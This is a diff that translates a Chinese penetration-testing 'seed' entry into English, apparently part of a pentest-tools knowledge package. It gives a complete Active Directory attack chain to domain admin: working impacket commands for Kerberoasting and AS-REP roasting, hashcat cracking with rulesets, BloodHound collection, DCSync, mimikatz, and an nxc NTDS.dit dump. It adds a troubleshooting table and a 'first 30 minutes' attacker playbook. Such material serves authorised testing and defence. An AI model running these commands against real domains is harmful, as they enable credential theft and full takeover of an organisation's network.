@@ -1,118 +1,118 @@
-# [种子] Kerberoasting → 离线破解 → DA
+# [Seed] Kerberoasting → offline cracking → DA
 
-## 场景分类
-渗透测试 / AD 攻击
+## Scenario category
+Penetration testing / AD attack
 
-## 目标概述
-有一个普通域用户凭据，目标域内存在配置 SPN 的服务账户，通过 Kerberoasting 拿到 TGS 离线爆破，破出明文密码后查 BloodHound 路径直通 DA。
+## Goal summary
+With standard domain-user credentials and an SPN-configured service account in the target domain, use Kerberoasting to obtain a TGS for offline cracking. Recover the plaintext password and use BloodHound to find a path directly to DA.
 
-## 完整执行链路
+## Full execution path
 
-1. 域内立足（任意普通用户，无需本地管理员）
-2. 枚举 SPN
+1. Establish an internal foothold with any standard user. Local administrator rights are not needed.
+2. Enumerate SPNs.
    ```bash
    GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
    ```
-3. 看哪些账户配了 SPN（通常是 SQL Server / IIS / 自定义服务账户）
-4. 离线破解
+3. Identify accounts with SPNs, usually SQL Server, IIS, or custom service accounts.
+4. Crack the hash offline.
    ```bash
    hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    ```
-5. 破出某 svc 账户密码 → BloodHound 查这个账户的可达路径
-6. 如果该账户在 Tier 0 组（Domain Admins / Server Operators / Backup Operators）→ 直接 DCSync
-7. 如果不在但能 RDP/WinRM 上某关键机 → 进去用 mimikatz dump，链式打到 DA
+5. Recover an svc account password → use BloodHound to find paths available to the account.
+6. If the account belongs to a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → run DCSync directly.
+7. If it does not, but it can RDP or WinRM to a key host → use mimikatz there and move laterally to DA.
 
-## 踩坑记录
+## Pitfall log
 
-| 问题 | 原因 | 解决方案 | 耗时 |
+| Problem | Cause | Solution | Time |
 |------|------|---------|------|
-| GetUserSPNs 无返回 | 当前用户没有读 SPN 权限 | 任何普通域用户都可以；可能是 -dc-ip 错或 PreAuth 未通 | 20min |
-| 破解几小时无果 | 密码强度高 | 1) 换字典（rockyou.txt + corp keywords）  2) 上 GPU（hashcat -d 1）  3) 试 OneRuleToRuleThemAll 规则集 | 数小时 |
-| 拿到密码登录失败 | 凭据已过期或大小写敏感 | 先用 nxc 验证：`nxc smb dc.local -u svc -p 'Pass'` | 10min |
-| BloodHound 没数据 | 数据采集时少了 GPO/ACL | `bloodhound-python -c All` 必须带 All；新版 BHCE 推荐 `--zip` | 30min |
-| AS-REP Roasting 没找到目标 | 设了 "Do not require Kerberos preauth" 的账户少 | 用 `GetNPUsers.py` 单独跑：` -usersfile users.txt -no-pass` | 15min |
+| GetUserSPNs returned nothing | The current user lacked permission to read SPNs | Any standard domain user can read them. Check for a wrong `-dc-ip` or unavailable PreAuth | 20min |
+| Cracking ran for hours without success | The password was strong | 1) Change dictionaries (rockyou.txt + corporate keywords) 2) Use a GPU (hashcat -d 1) 3) Try the OneRuleToRuleThemAll ruleset | Several hours |
+| Login failed after obtaining the password | The credential expired or was case-sensitive | Verify with nxc: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
+| BloodHound had no data | Collection omitted GPO/ACL data | `bloodhound-python -c All` must include All. The newer BHCE supports `--zip` | 30min |
+| AS-REP Roasting found no target | Few accounts had "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |
 
-## 工具链发现
+## Toolchain findings
 
-- **impacket-GetUserSPNs** 已是事实标准，比 PowerView 跨平台
-- **netexec (nxc)** 是 CrackMapExec 继任，速度快，自带 spider_plus / lsassy / ntds 等模块
-- **BloodHound Community Edition (BHCE)** 是新版，比旧 BloodHound 快很多
-- **OneRuleToRuleThemAll** 规则集做密码爆破效果最好
-- **bloodyAD** 是新生代 AD 工具，专攻"低权限利用 ACL 提权"
+- **impacket-GetUserSPNs** is a common choice and works across platforms, unlike PowerView.
+- **netexec (nxc)** replaces CrackMapExec. It is fast and includes spider_plus, lsassy, and ntds modules.
+- **BloodHound Community Edition (BHCE)** is the current release and is faster than the older BloodHound.
+- **OneRuleToRuleThemAll** is an effective ruleset for password cracking.
+- **bloodyAD** is a newer AD tool focused on low-privilege ACL exploitation and privilege escalation.
 
-## 关键代码/命令
+## Key code / commands
 
-完整 Kerberoasting 流程：
+Complete Kerberoasting flow:
 
 ```bash
-# 1. 验证凭据
+# 1. Verify credentials
 nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local
 
-# 2. 提取 TGS
+# 2. Extract the TGS
 GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
   -request -outputfile tgs.hash
 
-# 3. AS-REP 顺手一打
+# 3. Also run AS-REP Roasting
 GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
   -usersfile users.txt -no-pass -format hashcat \
   -outputfile asrep.hash
 
-# 4. 离线爆破
+# 4. Crack offline
 hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
 hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep
 
-# 5. 拿密码后采 BloodHound
+# 5. Collect BloodHound data after obtaining the password
 bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip
 
-# 6. 找路径：把 svc 账户标记为 Owned，看 Shortest Path to DA
+# 6. Find the path: mark the svc account as Owned and select Shortest Path to DA
 ```
 
-如果 svc 账户能访问 DC 上 SeBackupPrivilege：
+If the svc account can access SeBackupPrivilege on the DC:
 
 ```bash
 nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
-# 直接 dump NTDS.dit
+# Dump NTDS.dit directly
 ```
 
-## 对本包的改进建议
+## Improvement suggestions for this package
 
-- `pentest-tools/references/network-attack-defense.md` 应该有 Kerberoasting 完整章节
-- BloodHound CE 已是主流，bootstrap-manifest 应明确装 `bloodhound-ce-cli`
-- 增加 `pentest-tools/references/ad-cheatsheet.md` 把 6 大 AD 攻击（Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15）一页搞定
+- Add a full Kerberoasting section to `pentest-tools/references/network-attack-defense.md`.
+- BloodHound CE is now the main release. The bootstrap manifest should explicitly install `bloodhound-ce-cli`.
+- Add `pentest-tools/references/ad-cheatsheet.md` with the six major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page.
 
-## 可复用的模式/脚本片段
+## Reusable patterns / script fragments
 
-**域内立足后 30 分钟标准动作**：
+**Standard first 30 minutes after an internal foothold**:
 
 ```text
-1. nxc smb 验凭据 + 自动 spider 共享
-2. GetUserSPNs + GetNPUsers 一气
-3. bloodhound-python -c All 采集
-4. 同时离线爆破（GPU 跑着）
-5. 边等边过 BloodHound 查 Tier 0 / Pre-built attack paths
-6. 破出密码 → 标记 Owned → 重新查路径
+1. Verify credentials with nxc smb and spider shares automatically
+2. Run GetUserSPNs and GetNPUsers
+3. Collect data with bloodhound-python -c All
+4. Crack hashes offline in parallel on a GPU
+5. Review BloodHound for Tier 0 / pre-built attack paths while cracking runs
+6. Recover the password → mark Owned → check paths again
 ```
 
-**AD Kerberos hashcat mode 速查**：
+**AD Kerberos hashcat mode quick reference**:
 
-| 模式 | 用途 |
+| Mode | Use |
 |------|------|
 | 13100 | Kerberos TGS-Rep (Kerberoasting) |
 | 18200 | Kerberos AS-Rep (AS-REP Roasting) |
 | 5500  | NetNTLMv1 |
-| 5600  | NetNTLMv2 (Responder 抓到的) |
+| 5600  | NetNTLMv2 (captured by Responder) |
 | 19600 | Kerberos TGS-Rep (AES128) |
 | 19700 | Kerberos TGS-Rep (AES256) |
 
-## 进化动作
-- [ ] 增加 ad-cheatsheet.md
-- [ ] tool-index 检查 nxc / bloodhound-ce / bloodyAD 状态
-- [x] 路由矩阵已含 Kerberos / Kerberoasting
+## Evolution actions
+- [ ] Add ad-cheatsheet.md
+- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
+- [x] The routing matrix includes Kerberos / Kerberoasting
 
-## 环境信息
-- Kali 2026.x，impacket 0.12+, netexec 1.x, hashcat 6.2+
-- 目标 AD: Windows Server 2019/2022, 域功能级别 2016+
-- 攻击位置: 域内任意立足点（普通域用户）
+## Environment information
+- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
+- Target AD: Windows Server 2019/2022, domain functional level 2016+
+- Attack position: any internal foothold with a standard domain user
 
-## 脱敏要求
-本条目为种子数据，基于公开 AD 攻击技术模式编写，不涉及真实目标域。
+## Redaction requirements
+This seed entry is based on public AD attack techniques and does not involve a real target domain.
